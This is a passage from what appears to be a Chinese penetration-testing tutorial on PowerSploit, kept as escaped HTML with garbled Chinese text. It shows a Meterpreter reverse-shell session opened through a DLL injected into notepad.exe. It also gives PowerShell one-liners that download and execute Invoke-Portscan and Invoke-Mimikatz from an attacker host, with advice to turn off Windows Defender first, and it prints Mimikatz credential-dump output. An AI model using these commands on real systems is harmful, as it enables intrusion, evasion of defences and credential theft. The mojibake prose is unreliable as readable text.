&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;mf&#34;&gt;24&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;dll&lt;/span&gt;                                           &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;dll&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Msfå·²åå¼¹å›æ¥shellï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf6 exploit(multi/handler) &amp;gt; run
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[*] Started HTTPS reverse handler on https://172.16.0.107:4444
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[!] https://172.16.0.107:4444 handling request from 172.16.0.106; (UUID: izi6c4ik) Without a database connected that payload UUID tracking will not work!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[*] https://172.16.0.107:4444 handling request from 172.16.0.106; (UUID: izi6c4ik) Staging x64 payload (201308 bytes) ...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[!] https://172.16.0.107:4444 handling request from 172.16.0.106; (UUID: izi6c4ik) Without a database connected that payload UUID tracking will not work!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[*] Meterpreter session 3 opened (172.16.0.107:4444 -&amp;gt; 127.0.0.1 ) at 2022-01-17 18:39:10 +0800
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;meterpreter &amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥ç”¨å¾®è½¯å®˜æ–¹çš„è¿›ç¨‹æŸ¥çœ‹å·¥å…·&lt;a href=&#34;https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer&#34;&gt;process-explorer&lt;/a&gt;ï¼Œå¯ä»¥çœ‹åˆ°&lt;code&gt;notepad.exe&lt;/code&gt;å·²ç»è¢«åŠ è½½&lt;code&gt;test.dll&lt;/code&gt;è€Œä¸”æŸ¥çœ‹è°ƒç”¨è¯¥è¿›ç¨‹çš„dllæœ‰ä¸€æ¡ç½‘ç»œè¿æ¥ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;invoke-portscan&#34;&gt;Invoke-Portscan&lt;/h3&gt;
&lt;p&gt;Invoke-Portscanæ˜¯Reconæ¨¡å—ä¸‹çš„ä¸€ä¸ªè„šæœ¬ï¼Œä¸»è¦ç”¨äºç«¯å£æ‰«æï¼Œä½¿ç”¨èµ·æ¥ä¹Ÿæ¯”è¾ƒç®€å•ã€‚ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹&lt;/p&gt;
&lt;p&gt;å…ˆä¸‹è½½è„šæœ¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;IEX &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;DownloadString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://172.16.0.107:8000/Recon/Invoke-Portscan.ps1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åè¿›è¡Œæ‰«æï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-Portscan&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Hosts&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;106&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Ports&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;80,22,3389&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Hostname&lt;/span&gt;      &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;106&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;alive&lt;/span&gt;         &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;openPorts&lt;/span&gt;     &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;3389&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;closedPorts&lt;/span&gt;   &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;80&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;22&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;filter&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;edPorts&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;finishTime&lt;/span&gt;    &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2022&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;18&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;46&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;invoke-mimikatz&#34;&gt;Invoke-Mimikatz&lt;/h3&gt;
&lt;p&gt;Invoke-Mimikatzæ˜¯Exfiltrationæ¨¡å—ä¸‹çš„ä¸€ä¸ªè„šæœ¬ã€‚exeç‰ˆæœ¬çš„mimikatzå¤§å®¶éƒ½å¾ˆç†Ÿæ‚‰äº†ï¼Œè¦æƒ³è·å–åˆ°å‡­è¯å¿…é¡»æ˜¯ç®¡ç†å‘˜æƒé™ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹è½½è„šæœ¬ä¹‹å‰è¦å…ˆå…³é—­Windows defenderçš„å®æ—¶ä¿æŠ¤ï¼Œè¦ä¸ç„¶ä¼šè¢«æŸ¥æ€æ‰çš„ï¼Œä¸‹è½½å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;IEX &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;DownloadString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://172.16.0.107:8000/Exfiltration/Invoke-Mimikatz.ps1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæ‰§è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-Mimikatz&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-DumpCreds&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°è·å–ä¸åˆ°æ˜æ–‡ï¼Œä½†å¯ä»¥çœ‹åˆ°NTLMï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;å½“æœåŠ¡å™¨å®‰è£… KB2871997 è¡¥ä¸åï¼Œç³»ç»Ÿé»˜è®¤ç¦ç”¨ Wdigest Auth ï¼Œå†…å­˜ï¼ˆlsassè¿›ç¨‹ï¼‰ä¸å†ä¿å­˜æ˜æ–‡å£ä»¤ã€‚Mimikatz å°†è¯»ä¸åˆ°å¯†ç æ˜æ–‡ã€‚
ä½†ç”±äºä¸€äº›ç³»ç»ŸæœåŠ¡éœ€è¦ç”¨åˆ° Wdigest Authï¼Œæ‰€ä»¥è¯¥é€‰é¡¹æ˜¯å¯ä»¥æ‰‹åŠ¨å¼€å¯çš„ã€‚ï¼ˆå¼€å¯åï¼Œéœ€è¦ç”¨æˆ·é‡æ–°ç™»å½•æ‰èƒ½ç”Ÿæ•ˆï¼‰&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-mysql&#34; data-lang=&#34;mysql&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Invoke&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Mimikatz&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DumpCreds&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#####.   mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;## ^ ##.  &amp;#34;A La Vie, A L&amp;#39;Amour&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;## / \ ##  /* * *
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;## v ##&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;blog&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;gentilkiwi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;mimikatz&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;             &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;oe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;eo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;#####&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                                     &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;with&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;modules&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*/&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ERROR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mimikatz_initOrClean&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CoInitializeEx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;80010106&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;mimikatz&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# sekurlsa::logonpasswords
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Authentication&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Id&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2672147&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00000000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0028&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c613&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Session&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;           &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Interactive&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DWM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Domain&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Window&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Manager&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Logon&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Server&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Logon&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;Time&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2022&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;17&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;05&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SID&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;               &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;90&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;msv&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
